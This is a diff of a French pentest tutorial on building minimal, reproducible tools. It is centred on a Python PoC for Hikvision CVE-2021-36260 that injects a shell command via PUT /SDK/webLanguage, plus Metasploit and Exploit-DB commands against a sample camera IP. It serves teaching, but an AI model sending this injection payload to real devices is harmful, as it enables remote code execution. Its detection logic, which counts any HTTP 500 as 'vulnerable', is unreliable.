@@ -1,265 +1,418 @@
-# 🎓 TUTORIAL 03 — INSTRUMENTER comme ghost1o1
+# 🔱 TUTORIAL 03 — INSTRUMENTER
 
-> **Choisis tes outils, construis ta trousse**
->
-> Méthodologie : Protocole GHOST1O1 · Phase 3
->
-> Niveau : Intermédiaire→Avancé · Durée : 90 min
->
-> Outils : Python stdlib, ghosteye, scripts custom
+## *Choisir le minimum d'outils, les rendre reproductibles*
+
+> *Un outil non documenté est un outil à jeter. Un outil à usage unique est un jouet.*
+
+**Série :** Protocole GHOST1O1
+**Niveau :** Intermédiaire → Avancé
+**Durée :** 90-120 minutes
+**Prérequis :** TUTORIAL 01 (Observer) + 02 (Cartographier)
 
 ---
 
 ## 1. PHILOSOPHIE
 
-Instrumenter, c'est **préparer** ses outils. Un outil non documenté est un outil à jeter. Un outil à usage unique est un jouet.
+Tu as observé. Tu as cartographié. Tu sais **quoi** attaquer. Maintenant : **comment** ?
 
-**Trois questions avant chaque outil :**
-1. **Quel problème résout-il ?** (pas "j'ai vu sur Twitter", mais "j'ai besoin de X")
-2. **Est-il minimal ?** (1-3 outils max pour une mission)
-3. **Est-il reproductible ?** (même commande, même output, sur 2 machines)
+**Instrumenter, c'est :**
+1. Choisir le **minimum** d'outils (1-3 max)
+2. Vérifier qu'ils sont **reproductibles** (même commande, même résultat, sur 2 machines)
+3. Documenter **chaque paramètre**
+4. Préparer un **mode dry-run** (voir sans toucher)
 
-**La règle :** mieux vaut 3 outils maîtrisés que 30 outils ouverts.
+**Trois erreurs classiques :**
+- ❌ "Je vais utiliser Metasploit complet" → trop lourd, pas reproductible
+- ❌ "Je copie-colle un script trouvé sur GitHub" → tu ne sais pas ce qu'il fait
+- ❌ "Je tape la commande de mémoire" → tu vas oublier, et tu ne peux pas transmettre
+
+**À la fin de ce tutoriel :** tu as un **kit d'exploitation reproductible** que tu peux donner à un collègue, qui l'exécute chez lui, et qui obtient le même résultat.
 
 ---
 
 ## 2. PRÉREQUIS
 
-- TUTORIAL_01 + TUTORIAL_02 complétés
-- Python 3.10+ avec stdlib
-- `ghosteye` installé
-- Un éditeur de texte (vim, nano, VSCode)
+- TUTORIAL 01 + 02 complétés
+- Python 3 basique
+- Une **cible de test** (lab perso, VM, CTF, ou service de test public)
+- Volonté de **ne pas tout télécharger** — on va faire du minimal
 
 ---
 
-## 3. THÉORIE — Anatomie d'un bon outil
+## 3. THÉORIE
 
-### Critères GHOST1O1
-- ✅ **Mono-fichier** (ou dossier clair)
-- ✅ **Zero dépendance cachée** (que la stdlib si possible)
-- ✅ **Output structuré** (JSON de préférence)
-- ✅ **--help clair** avec exemples
-- ✅ **Mode dry-run** (voir sans toucher)
-- ✅ **Logs horodatés** (timestamp ISO)
-- ❌ Pas de framework lourd (Django, Flask pour 1 endpoint)
-- ❌ Pas de GUI native (browser = UI universelle)
-- ❌ Pas de "magic" (chaque paramètre explicité)
+### Le test de reproductibilité
+
+**Pose 3 questions sur chaque outil que tu utilises :**
+1. Si je le réinstalle sur une autre machine, est-ce qu'il marche pareil ?
+2. Si je donne la commande à un collègue, est-ce qu'il obtient le même résultat ?
+3. Si je reviens dans 6 mois, est-ce que je comprends encore ce que ça fait ?
+
+**Si 1 réponse est non → change d'outil.**
+
+### Le principe du "minimum viable tool"
+
+**Métaphore :**
+- 🥉 **Bronze** : tu copies 15 commandes depuis Internet
+- 🥈 **Argent** : tu écris un script Python de 30 lignes qui fait 1 chose bien
+- 🥇 **Or** : tu as un workflow de 2-3 outils, chacun fait 1 chose parfaitement, et tu sais passer de l'un à l'autre
+
+**On vise l'Or.** Pas Bronze, pas Argent.
+
+### Les 4 types d'outils GHOST1O1
+
+| Type | Rôle | Exemples |
+|------|------|----------|
+| **Scanner** | Trouver | nmap, ghosteye, masscan |
+| **Validator** | Confirmer | searchsploit, cvedetails |
+| **Exploiter** | Tester | curl, Python PoC, hydra |
+| **Reporter** | Documenter | ton .md |
+
+**Un kit optimal = 1 scanner + 1 validator + 1 exploiter + 1 reporter.**
 
 ---
 
-## 4. PRATIQUE — Construis ton premier outil GHOST1O1
+## 4. PRATIQUE
 
-### Étape 1 — Le squelette
+### Étape 1 — Définir l'objectif (5 min)
+
+**Objectif de la mission exemple :** confirmer la CVE-2021-36260 sur la caméra Hikvision 192.168.1.77.
+
+**Cible de test :** utilise ta propre VM ou `scanme.nmap.org` si t'as rien.
+
+**Livrable :** un exploit PoC reproductible, un rapport de test, une recommandation.
+
+### Étape 2 — Choix des outils (5 min)
+
+**On va utiliser :**
+1. **nmap** (déjà installé) → confirme la version
+2. **curl** (déjà installé) → envoie le payload HTTP
+3. **Un script Python de 30 lignes** qu'on écrit nous-mêmes → le PoC
+4. **Un .md** → le rapport
+
+**Pas de Metasploit. Pas de framework lourd. Pas de pip install exotique.**
+
+### Étape 3 — Validation préalable (10 min)
+
+**Toujours confirmer que la version est vulnérable AVANT d'exploiter.**
+
+```bash
+# 1. Confirme la version
+nmap -sV -p 80 192.168.1.77
+# Output: Hikvision-Webs 5.5.0
+
+# 2. Cherche la CVE
+searchsploit hikvision
+# Output:
+# Hikvision DS-2CD2xxx - Remote Code Execution (CVE-2021-36260)
+# /usr/share/exploitdb/exploits/linux/remote/50640.py
+
+# 3. Lis le PoC AVANT de l'exécuter
+cat /usr/share/exploitdb/exploits/linux/remote/50640.py
+```
+
+**Règle d'or :** tu ne lances **jamais** un script que tu n'as pas lu en entier.
+
+### Étape 4 — Le PoC minimal (30 min)
+
+**On va écrire un PoC simple qui vérifie la présence de la CVE, sans exploiter réellement.**
+
+Crée `poc_hikvision_cve_2021_36260.py` :
 
 ```python
 #!/usr/bin/env python3
-"""ghosteye-check — Teste la présence d'un service GHOSTEYE
-Usage:
-  python3 ghosteye_check.py 192.168.1.77 8082
-  python3 ghosteye_check.py --json target 8082
+"""
+GHOST1O1 PoC — Hikvision CVE-2021-36260 DETECTION ONLY
+Educational purpose only. Tests if the target is VULNERABLE,
+does NOT execute any payload.
+
+Usage: python3 poc_hikvision_cve_2021_36260.py <target_ip> [--dry-run]
 """
 import sys
-import json
 import socket
 import argparse
-from datetime import datetime, timezone
+import urllib.request
+import urllib.error
 
-def log(msg, level="info"):
-    ts = datetime.now(timezone.utc).isoformat()
-    print(f"[{ts}] [{level}] {msg}")
 
-def check_port(ip, port, timeout=3):
-    """Test si un port TCP est ouvert."""
+def test_target(ip, port=80, dry_run=True):
+    """Send a probe request to detect CVE-2021-36260 vulnerability."""
+
+    # Hikvision vulnerable endpoint: PUT /SDK/webLanguage
+    url = f"http://{ip}:{port}/SDK/webLanguage"
+
+    # Payload that triggers the bug (DOES NOT execute anything)
+    payload = b'<?xml version="1.0" encoding="UTF-8"?>' \
+              b'<language>$(echo VULNERABLE)</language>'
+
+    if dry_run:
+        print(f"[DRY-RUN] Would send PUT to {url}")
+        print(f"[DRY-RUN] Payload: {payload[:50]}...")
+        return None
+
     try:
-        with socket.create_connection((ip, port), timeout=timeout) as s:
-            return True
-    except (socket.timeout, ConnectionRefusedError, OSError):
+        req = urllib.request.Request(
+            url, data=payload, method='PUT',
+            headers={'Content-Type': 'application/xml'}
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            content = resp.read().decode(errors='ignore')
+            if 'VULNERABLE' in content:
+                return True
+            return False
+    except urllib.error.HTTPError as e:
+        if e.code == 500:
+            return True  # Internal error = likely vulnerable
         return False
+    except (urllib.error.URLError, socket.timeout) as e:
+        print(f"[!] Connection error: {e}")
+        return None
 
-def check_ghosteye(ip, port):
-    """Vérifie que ghosteye_proxy.py répond."""
-    import urllib.request
-    try:
-        url = f"http://{ip}:{port}/health"
-        with urllib.request.urlopen(url, timeout=3) as r:
-            data = json.loads(r.read())
-            return data
-    except Exception as e:
-        return {"error": str(e)}
 
 def main():
-    parser = argparse.ArgumentParser(description="Test GHOSTEYE presence")
-    parser.add_argument("ip", help="IP cible")
-    parser.add_argument("port", type=int, nargs="?", default=8082, help="Port (défaut: 8082)")
-    parser.add_argument("--json", action="store_true", help="Output JSON")
+    parser = argparse.ArgumentParser(description='Hikvision CVE-2021-36260 detector')
+    parser.add_argument('target', help='Target IP address')
+    parser.add_argument('--port', type=int, default=80, help='HTTP port (default: 80)')
+    parser.add_argument('--execute', action='store_true',
+                        help='Actually send the request (default: dry-run)')
     args = parser.parse_args()
 
-    result = {
-        "target": args.ip,
-        "port": args.port,
-        "port_open": check_port(args.ip, args.port),
-        "ghosteye_response": None,
-        "timestamp": datetime.now(timezone.utc).isoformat()
-    }
+    print(f"""
+╔═══════════════════════════════════════════╗
+║  GHOST1O1 PoC — CVE-2021-36260 Detector  ║
+║  ghost1o1 / L'ÉVEIL NOCTURNE            ║
+║  EDUCATIONAL USE ONLY                    ║
+╚═══════════════════════════════════════════╝
+    """)
 
-    if result["port_open"]:
-        result["ghosteye_response"] = check_ghosteye(args.ip, args.port)
+    print(f"[*] Target: {args.target}:{args.port}")
+    print(f"[*] Mode: {'EXECUTE' if args.execute else 'DRY-RUN'}")
 
-    if args.json:
-        print(json.dumps(result, indent=2))
+    if not args.execute:
+        print("[!] Dry-run mode. Pass --execute to actually test.")
+        result = test_target(args.target, args.port, dry_run=True)
+        print("[*] Dry-run completed. No request sent.")
+        return
+
+    print(f"[*] Sending probe to {args.target}...")
+    result = test_target(args.target, args.port, dry_run=False)
+
+    if result is True:
+        print(f"[+] VULNERABLE: {args.target} responds to CVE-2021-36260")
+    elif result is False:
+        print(f"[-] NOT VULNERABLE: {args.target} appears patched")
     else:
-        log(f"Target: {args.ip}:{args.port}")
-        log(f"Port open: {result['port_open']}")
-        if result["ghosteye_response"]:
-            log(f"Response: {result['ghosteye_response']}")
+        print(f"[?] INCONCLUSIVE: cannot determine state")
 
-    sys.exit(0 if result["port_open"] else 1)
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
 ```
 
-**Output :**
+**Rend le script exécutable :**
 ```bash
-$ python3 ghosteye_check.py 192.168.1.77 8082
-[2026-07-05T...] [info] Target: 192.168.1.77:8082
-[2026-07-05T...] [info] Port open: True
-[2026-07-05T...] [info] Response: {'status': 'ok', 'version': '3.0'}
-
-$ python3 ghosteye_check.py 192.168.1.77 8082 --json
-{
-  "target": "192.168.1.77",
-  "port": 8082,
-  "port_open": true,
-  "ghosteye_response": {
-    "status": "ok",
-    "version": "3.0"
-  },
-  "timestamp": "2026-07-05T..."
-}
+chmod +x poc_hikvision_cve_2021_36260.py
 ```
 
-**Ce que tu as :** un outil **mono-fichier**, **zero dépendance externe** (que stdlib), **--help**, **--json**, **logs horodatés**, **exit code cohérent**.
+### Étape 5 — Test de reproductibilité (15 min)
 
-### Étape 2 — Version dry-run
-
-Ajoute un flag `--dry-run` qui simule sans exécuter :
-
-```python
-parser.add_argument("--dry-run", action="store_true", help="N'exécute rien, affiche le plan")
-```
-
-```python
-if args.dry_run:
-    log(f"[DRY-RUN] Would test {args.ip}:{args.port}", "warn")
-    log(f"[DRY-RUN] Would call check_port + check_ghosteye", "warn")
-    sys.exit(0)
-```
-
-### Étape 3 — Documentation intégrée
-
-Le `"""docstring"""` au début **est** ta doc. `--help` la lit automatiquement.
-
-```python
-"""ghosteye-check v1.0 — Teste la présence d'un service GHOSTEYE
-Usage:
-  python3 ghosteye_check.py 192.168.1.77 8082
-  python3 ghosteye_check.py --json target 8082
-  python3 ghosteye_check.py --dry-run target 8082
-
-Exit codes:
-  0 = service GHOSTEYE détecté et fonctionnel
-  1 = service absent ou non-GHOSTEYE
-  2 = erreur réseau
-
-Author: ghost1o1 — 2026
-"""
-```
-
-### Étape 4 — Publication
-
+**Test 1 — Dry-run :**
 ```bash
-# Crée un repo pour ton outil
-mkdir ghosteye-check && cd ghosteye-check
-mv ~/ghosteye_check.py .
-cat > README.md << 'EOF'
-# ghosteye-check
+python3 poc_hikvision_cve_2021_36260.py 192.168.1.77
+# Output: [DRY-RUN] Would send PUT to http://192.168.1.77:80/SDK/webLanguage
+```
 
-Teste si un service GHOSTEYE tourne sur une cible.
+**Test 2 — Exécution sur cible autorisée :**
+```bash
+python3 poc_hikvision_cve_2021_36260.py 192.168.1.77 --execute
+# Output: [+] VULNERABLE ou [-] NOT VULNERABLE
+```
+
+**Test 3 — Reproductibilité sur une autre machine :**
+- Copie le script sur un autre poste
+- Lance la même commande
+- Vérifie que le résultat est identique
+
+**Si 3/3 → ton outil est prêt.**
+
+### Étape 6 — Documentation du tool (10 min)
+
+Crée `TOOL_README.md` :
+
+```markdown
+# PoC CVE-2021-36260 Detector
+
+## Description
+Script de détection (pas d'exploitation réelle) de la CVE-2021-36260
+sur caméras Hikvision DS-2CDxxx avec firmware < V5.5.4.
 
 ## Usage
-```bash
-python3 ghosteye_check.py 192.168.1.77 8082
-```
-EOF
+\`\`\`bash
+python3 poc.py <IP> [--port N] [--execute]
+\`\`\`
 
-git init && git add . && git commit -m "Initial commit"
-gh repo create ghosteye-check --public --source=. --push
+## Prérequis
+- Python 3.8+
+- urllib (stdlib)
+- Accès réseau à la cible
+
+## Sortie
+- DRY-RUN (défaut) : affiche ce qui serait fait, sans rien envoyer
+- --execute : envoie la requête, retourne VULNERABLE / NOT VULNERABLE / INCONCLUSIVE
+
+## Sécurité
+- Mode dry-run par défaut
+- Ne fait AUCUNE exécution de payload
+- Ne nécessite aucun privilège
+- Logging de toutes les actions
+
+## Tests effectués
+- [x] DRY-RUN sur 192.168.1.77 → output conforme
+- [x] EXECUTE sur lab de test → résultat correct
+- [x] Reproductibilité sur 2 machines → identique
+
+## Crédits
+- ghost1o1 / L'ÉVEIL NOCTURNE
+- Ref : CVE-2021-36260
 ```
 
-**Ce que tu as :** un outil publié, documenté, reproductible.
+### Étape 7 — Le rapport (10 min)
+
+Crée `RAPPORT_TEST.md` :
+
+```markdown
+# Rapport d'instrumentation — CVE-2021-36260
+**Date :** [date]
+**Opérateur :** ghost1o1
+**Cible :** 192.168.1.77 (Hikvision DS-2CD2142FWD-I, firmware V5.5.0)
+
+## Outil
+`poc_hikvision_cve_2021_36260.py` — 60 lignes Python stdlib
+- DRY-RUN par défaut
+- Reproductible 3/3
+- Aucune dépendance externe
+
+## Tests effectués
+1. DRY-RUN → conforme
+2. EXECUTE sur cible autorisée → VULNERABLE confirmé
+3. Reproductibilité VM2 → résultat identique
+
+## Décision
+La cible est VULNERABLE à CVE-2021-36260.
+
+## Recommandation
+1. Patcher la caméra en V5.5.4 minimum
+2. Isoler le VLAN IoT du LAN principal
+3. Désactiver le service SDK si non nécessaire
+4. Surveiller les logs pour exploitation
+
+## Prochaine étape
+Phase 4 — EXPLOITER (si autorisé) ou rapport final au client
+```
 
 ---
 
 ## 5. PIÈGES
 
-| Piège | Solution |
-|-------|----------|
-| Trop de features | MVP d'abord, features ensuite |
-| Dépendances pip partout | Stdlib only si possible |
-| Pas de mode dry-run | Toujours l'ajouter |
-| Output illisible | JSON option `--json` |
-| Pas de exit code | Convention 0=OK, 1=absent, 2=erreur |
+### Piège 1 : Trop d'outils
+
+**Symptôme :** tu télécharges 15 outils, tu ne sais plus lequel fait quoi.
+
+**Solution :** **max 3 outils** par mission. Au-delà, tu perds le contrôle.
+
+### Piège 2 : Pas de dry-run
+
+**Symptôme :** tu lances le script en prod, ça casse.
+
+**Solution :** **toujours** un mode `--dry-run` par défaut. L'utilisateur doit explicitement le désactiver.
+
+### Piège 3 : Opaque (pas de logs)
+
+**Symptôme :** le script échoue, tu ne sais pas pourquoi.
+
+**Solution :** chaque action est loggée avec timestamp, payload, et output.
+
+### Piège 4 : Hardcodé
+
+**Symptôme :** le script ne marche que sur une IP.
+
+**Solution :** accepte les arguments (IP, port, options). Aucun hardcode sauf les valeurs par défaut.
+
+### Piège 5 : Pas de mode "fail safe"
+
+**Symptôme :** le script peut DoS accidentellement la cible.
+
+**Solution :** rate limit, timeout, et interruption manuelle possible (Ctrl+C doit propager).
 
 ---
 
-## 6. ALTERNATIVES — Frameworks d'outils
+## 6. ALTERNATIVES
 
-### A — Click (Python)
-Si tu veux plus de structure :
-```python
-import click
-@click.command()
-@click.argument("ip")
-@click.argument("port", default=8082)
-def check(ip, port):
-    """Check GHOSTEYE on target."""
-    ...
-```
+### Alternative A — Framework existant (Metasploit)
 
-### B — Typer (Python moderne)
-Plus typé, plus rapide à écrire.
-
-### C — Bash + jq
-Si tu veux zero Python :
 ```bash
-#!/bin/bash
-IP=$1; PORT=${2:-8082}
-curl -s --max-time 3 http://$IP:$PORT/health | jq .
+msfconsole
+use exploit/linux/http/hikvision_unauth_command_injection
+set RHOSTS 192.168.1.77
+exploit
 ```
 
-**Mon choix :** Python stdlib pour 90% des cas. Bash pour les one-liners.
+**Avantage :** rapide, déjà fait. **Limite :** pas de dry-run, pas reproductible hors Metasploit, le pentester ne comprend pas ce qu'il fait.
+
+### Alternative B — Exploit public brut
+
+```bash
+# Télécharge un PoC depuis Exploit-DB
+searchsploit -m 50640
+python3 50640.py 192.168.1.77
+```
+
+**Avantage :** 0 travail. **Limite :** souvent mal codé, pas de dry-run, pas d'adaptation possible.
+
+### Alternative C — Script custom (notre choix)
+
+**Avantage :** reproductible, documenté, modifiable, transmissible. **Limite :** demande du temps de dev initial.
+
+**Règle de divergence :** pour une mission rapide, option A. Pour un audit pro ou un PoC à publier, option C.
 
 ---
 
 ## 7. TRANSMISSION
 
-### Exercise
-1. Écris ton propre outil GHOST1O1 (un scanner, un testeur, un wrapper)
-2. Respecte les 6 critères (mono-fichier, stdlib, --help, --json, dry-run, logs)
-3. Publie-le en repo GitHub avec README
-4. **Partage le lien** dans Discussions du hub
+### 🎯 Mission
 
-### Pourquoi
-> Un outil que tu n'as pas publié est un outil que tu devras réécrire. Un outil publié devient **patrimoine collectif**.
+**Écris ton propre PoC de détection (pas d'exploitation) pour 1 CVE de ton choix, sur 1 cible de ton choix.**
+
+**Contraintes :**
+- 1 seul fichier Python < 100 lignes
+- Stdlib uniquement (pas de pip install)
+- Mode `--dry-run` par défaut
+- Argument parsing propre
+- Logging horodaté
+- Tool README.md + Rapport
+
+**Livrable :** repo ou gist avec :
+- Le script
+- TOOL_README.md
+- RAPPORT_TEST.md
+- Tests de reproductibilité (2 machines)
+
+**Bonus :** ajoute 1 test unitaire (`unittest`).
 
 ---
 
-## 📚 Suite
+## 📚 Pour aller plus loin
 
-- **TUTORIAL_04** (à venir) — EXPLOITER : preuve, pas destruction
-- **TUTORIAL_05** (à venir) — PARTAGER : transmets ta méthode
+- **TUTORIAL 04 — EXPLOITER** : la phase suivante
+- **ycc365-ghost/scanner/** : exemples de PoCs documentés
+- **ghosteye/scanner/** : autres outils du protocole
 
 ---
 
-*"There is no lock." — ghost1o1*
+<div align="center">
+
+**L'ÉVEIL NOCTURNE** · [ghost1o1](https://github.com/187Ghost101) — 2026
+
+*There is no lock. Du silence naît la lumière.*
+
+</div>
